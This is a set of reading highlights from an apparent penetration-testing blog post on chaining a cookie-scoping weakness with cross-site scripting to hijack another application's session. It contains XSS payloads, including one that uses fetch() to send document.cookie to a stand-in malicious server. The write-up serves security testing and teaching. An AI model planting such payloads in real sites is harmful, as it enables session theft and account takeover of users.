---
author: Anurag Mondal
aliases:
  - "From Informational to Critical: Chaining & Elevating Web Vulnerabilities"
tags:
  - readwise/articles
url: https://www.netspi.com/blog/technical-blog/web-application-pentesting/uncovering-a-critical-vulnerability-through-chained-findings/
date: 2024-12-19
---
# From Informational to Critical: Chaining & Elevating Web Vulnerabilities

![rw-book-cover](https://www.netspi.com/wp-content/uploads/2024/12/12.11.24_TECH_Chaining-Elevating-Vulnerabilities_Social-1.webp)

## Highlights


## The Attack Chain Begins: Cross-Application Cookie Exposure 

 The issue stemmed from the fact that all **applications were sharing the same cookie storage on the client side**. This led to an **Informational Severity finding, due to the way cookies were scoped to the parent domain** (i.e., example.com). While each application had its own port, they were all vulnerable to **Cross-Application Cookie Exposure**, a scenario where cookies could be leaked between the different applications running on the same domain.
 
 Although important, this finding did not initially have a major impact, because none of the applications depended on session-based authentication. However, that changed when I noticed something unusual in Application C.
> [View Highlight](https://read.readwise.io/read/01jfdb6zs4r2pae670kdy4mdxa)

## XSS on a different origin

This discovery was pivotal. I could now attempt to hijack Application C’s session using the XSS vulnerability in Application A. However, there were several hurdles to overcome.

Nothing worked. I was about to give up when I noticed something crucial—the overwriting of the JSESSIONID cookie from Application C didn’t happen instantaneously. It took a few seconds for the cookie to be updated. So, I decided to add a 5-second delay before executing my payload: 
 ```html
 <script>setTimeout(() => { alert(document.cookie) }, 5000)</script>
```

 ![](https://www.netspi.com/wp-content/uploads/2024/12/12.11.24_EXEC_Chaining-Elevating-Vulnerabilities_4-1024x415.webp)
 This worked perfectly! I was able to access the JSESSIONID cookie issued by Application C, and I quickly crafted a stealthy payload to steal it: 
```html
<script>setTimeout(()=>{fetch('https://my-malicious-server.com?cookie='+document.cookie).then()},5000)</script>
```

> [View Highlight](https://read.readwise.io/read/01jfdbc0srb657wsyz6ef4vsbr)

## Full Attack Chain
 ![](https://www.netspi.com/wp-content/uploads/2024/12/12.11.24_EXEC_Chaining-Elevating-Vulnerabilities_6-1024x753.webp)
> [View Highlight](https://read.readwise.io/read/01jfdbddwd96vpzgrwxas4b811)



